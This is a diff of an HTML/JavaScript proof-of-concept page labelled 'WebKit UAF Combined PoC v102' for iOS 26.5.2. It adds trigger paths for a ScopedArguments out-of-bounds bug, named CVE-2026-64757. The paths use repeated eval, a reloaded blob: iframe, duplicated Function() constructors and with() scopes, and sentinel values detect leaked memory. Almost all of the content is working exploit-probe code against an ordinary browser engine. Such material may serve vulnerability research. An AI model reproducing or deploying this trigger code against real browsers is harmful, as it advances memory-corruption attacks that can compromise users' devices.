+  return URL.createObjectURL(new Blob([html], {type:'text/html'}));
+}
+
+async function runScopedArgs(){
+  if(!_inAll){ dis(true); L.innerHTML=''; }
   log('','');
-  log(`  Timing strategy: ${useRaf ? 'RAF wait' : 'tick wait'}`, 'inf');
-  log('','');
+  log('╔══════════════════════════════════════════════════════════════╗','hi');
+  log('║  CVE-2026-64757 · ScopedArguments OOB  (v102)               ║','hi');
+  log('╚══════════════════════════════════════════════════════════════╝','hi');
 
-  await runPathB(useRaf);
-  await runPathC(useRaf);
-  await runPathD(useRaf);
-  await runPathE(useRaf);
+  const SENTS = new Set([0xBEEF00,0xBEEF01,0xBEEF02,0xBEEF03,0xBEEF04,0xBEEF05,0xBEEF06,0xBEEF07]);
+  const EXPECTED = [10,20,30,40,50,60,70,80];
+  let saHits = 0;
 
+  /* ── PATH-A: in-page eval x2 ── */
+  log('\n  ── PATH-A: EVAL x2 (in-page bytecode reuse) ──','hi');
+  {
+    const src = `(function(){
+      var lx0=0xBEEF00,lx1=0xBEEF01,lx2=0xBEEF02,lx3=0xBEEF03;
+      var lx4=0xBEEF04,lx5=0xBEEF05,lx6=0xBEEF06,lx7=0xBEEF07;
+      function probe(a0,a1,a2,a3,a4,a5,a6,a7){
+        void(lx0+lx1+lx2+lx3+lx4+lx5+lx6+lx7);
+        var r=[]; for(var i=0;i<8;i++) r.push(arguments[i]); return r;
+      }
+      for(var i=0;i<20000;i++) probe(10,20,30,40,50,60,70,80);
+      return probe(10,20,30,40,50,60,70,80);
+    })()`;
+
+    let r1,r2;
+    try{ r1=eval(src); }catch(e){ log(`  eval1 err: ${e}`,'bad'); }
+    try{ r2=eval(src); }catch(e){ log(`  eval2 err: ${e}`,'bad'); }
+
+    let leaks=0;
+    if(r1&&r2){
+      for(let i=0;i<8;i++){
+        if(r2[i]!==EXPECTED[i]){
+          leaks++;
+          log(`  !! [eval2 arg${i}] got 0x${r2[i].toString(16)} exp=${EXPECTED[i]} sent=${SENTS.has(r2[i])}`,'hit');
+        }
+      }
+      if(leaks===0) log(`  ok [eval x2]: [${r1}] → [${r2}]`,'ok');
+      else saHits++;
+    }
+  }
+  await tick();
+
+  /* ── PATH-B: blob: URL iframe — SAME-ORIGIN postMessage ── */
+  log('\n  ── PATH-B: BLOB: URL IFRAME (bytecode cache round-trip) ──','hi');
+  log('  blob: URL inherits parent origin → postMessage works','inf');
+  log('  Phase1 warm load → navigate away → Phase2 same URL reload','inf');
+
+  const frame = document.getElementById('sc_frame');
+  const probeResults = {};
+
+  const msgHandler = (e) => {
+    if(e.data && e.data.type==='sa_probe'){
+      probeResults[e.data.phase] = e.data.result;
+      log(`  [msg] phase=${e.data.phase} result=[${e.data.result}]`,'inf');
+    }
+  };
+  window.addEventListener('message', msgHandler);
+
+  // Create stable blob URL (persists, not revoked between loads → same URL = cache hit)
+  let blobUrl = null;
+  try{ blobUrl = makeBlobProbeUrl(); } catch(e){ log(`  blob URL err: ${e}`,'bad'); }
+
+  if(blobUrl){
+    log('  phase1: loading blob iframe...','inf');
+    frame.src = blobUrl;
+    await wait(2000); // wait for JIT warmup (20000 iters)
+
+    if(probeResults['warm']){
+      log(`  phase1 received: [${probeResults['warm']}]`,'ok');
+    } else {
+      log('  phase1: no message received','bad');
+    }
+
+    // Navigate away then reload same blob URL → JSC sees same URL → cache hit
+    log('  phase2: navigate away + reload same blob URL...','inf');
+    frame.src = 'about:blank';
+    await wait(300);
+    frame.src = blobUrl; // SAME URL → bytecode cache decode path
+    await wait(2000);
+
+    if(probeResults['hot']){
+      log(`  phase2 received: [${probeResults['hot']}]`,'ok');
+      // Compare
+      let leaks=0;
+      for(let i=0;i<8;i++){
+        const v = probeResults['hot'][i];
+        if(v !== EXPECTED[i]){
+          leaks++;
+          const isSent = SENTS.has(v);
+          log(`  !! [blob arg${i}] phase2=${v} (exp ${EXPECTED[i]}) sentinel=${isSent}`,'hit');
+        }
+      }
+      if(leaks===0) log(`  ok [blob reload]: phase2 matches expected`,'ok');
+      else saHits++;
+
+      // Also compare phase1 vs phase2 directly
+      if(probeResults['warm']){
+        let diff=0;
+        for(let i=0;i<8;i++){
+          if(probeResults['warm'][i]!==probeResults['hot'][i]){ diff++; }
+        }
+        if(diff>0){
+          log(`  !! [phase diff] ${diff} values differ between warm and hot load`,'hit');
+          saHits++;
+        } else {
+          log(`  ok [phase diff]: phase1 === phase2`,'ok');
+        }
+      }
+    } else {
+      log('  phase2: no message received','bad');
+    }
+
+    // Cleanup blob URL
+    try{ URL.revokeObjectURL(blobUrl); }catch(e){}
+  } else {
+    log('  blob: URL unavailable, skipping PATH-B','bad');
+  }
+
+  window.removeEventListener('message', msgHandler);
+  frame.src='about:blank';
+  await tick();
+
+  /* ── PATH-C: Function() ctor × 2 with grow trigger ── */
+  log('\n  ── PATH-C: Function() CTOR x2 + RESIZE TRIGGER ──','hi');
+  log('  Second Function() call of same body → JSC may cache parsed bytecode','inf');
+  {
+    // Vary arg count across calls to stress trySetLength resize path
+    const body = `
+      var lx0=0xBEEF00,lx1=0xBEEF01,lx2=0xBEEF02,lx3=0xBEEF03;
+      var lx4=0xBEEF04,lx5=0xBEEF05,lx6=0xBEEF06,lx7=0xBEEF07;
+      function p(a0,a1,a2,a3,a4,a5,a6,a7,a8,a9,a10,a11,a12,a13,a14,a15){
+        void(lx0+lx1+lx2+lx3+lx4+lx5+lx6+lx7);
+        var r=[]; for(var i=0;i<16;i++) r.push(arguments[i]); return r;
+      }
+      for(var i=0;i<20000;i++) p(1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16);
+      return p(1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16);
+    `;
+    const exp16 = Array.from({length:16},(_,i)=>i+1);
+    let r1,r2;
+    try{ r1=new Function(body)(); }catch(e){ log(`  fn1 err: ${e}`,'bad'); }
+    try{ r2=new Function(body)(); }catch(e){ log(`  fn2 err: ${e}`,'bad'); }
+
+    let leaks=0;
+    if(r1&&r2){
+      for(let i=0;i<16;i++){
+        if(r2[i]!==exp16[i]){
+          leaks++;
+          log(`  !! [fn2 arg${i}] got ${r2[i]} exp ${exp16[i]}`,'hit');
+        }
+      }
+      if(leaks===0) log(`  ok [Function() x2, 16 args]: correct`,'ok');
+      else saHits++;
+    }
+  }
+  await tick();
+
+  /* ── PATH-D: with() → max scoped args pressure ── */
+  log('\n  ── PATH-D: with() FORCED SCOPED ARGS ──','hi');
+  {
+    const obj={w0:0xDEAD0,w1:0xDEAD1,w2:0xDEAD2,w3:0xDEAD3};
+    try{
+      const r = new Function('obj',`
+        with(obj){
+          function inner(a0,a1,a2,a3,a4,a5,a6,a7,a8,a9,a10,a11,a12,a13,a14,a15){
+            return [arguments[0],arguments[1],arguments[2],arguments[3],
+                    arguments[4],arguments[5],arguments[6],arguments[7],
+                    arguments[8],arguments[9],arguments[10],arguments[11],
+                    arguments[12],arguments[13],arguments[14],arguments[15]];
+          }
+          for(var i=0;i<20000;i++) inner(1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16);
+          return inner(1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16);
+        }
+      `)(obj);
+      let leaks=0;
+      for(let i=0;i<16;i++) if(r[i]!==i+1) leaks++;
+      if(leaks===0) log(`  ok [with(), 16 args]: correct`,'ok');
+      else { saHits++; log(`  !! [with()] ${leaks} wrong values`,'hit'); }
+    }catch(e){ log(`  with() err: ${e}`,'bad'); }
+  }
+
+  log(`\n  CVE-2026-64757 TOTAL: ${saHits} path(s) with anomalies`, saHits>0?'hit':'ok');
+  if(!_inAll) dis(false);
+}
+
+
+/* ════════════════════════════════════════════════════════════════════════════
+   RUN ALL
+   ════════════════════════════════════════════════════════════════════════════ */
+async function runAll(){
+  _inAll=true; dis(true); L.innerHTML='';
+  log('╔══════════════════════════════════════════════════════════════╗','hi');
+  log('║  WebKit UAF Combined PoC v102  ·  iOS 26.5.2 / A16 arm64e  ║','hi');
+  log('║  CVE-2026-64783  +  CVE-2026-64757                         ║','hi');
+  log('╚══════════════════════════════════════════════════════════════╝','hi');
+  await runDataList();
+  await tick();
+  await runScopedArgs();
   log('','');
   log('══════════════════════════════════════════════════════════════','hi');
-  log(`  v102 RUN ALL COMPLETE · total UAF signals: ${uafTotal}`, uafTotal>0?'hit':'ok');
+  log('  ALL PATHS COMPLETE','hi');
   log('══════════════════════════════════════════════════════════════','hi');
-
-  _inRunAll = false;
-  dis(false);
+  _inAll=false; dis(false);
   copyLog();
 }
 </script>
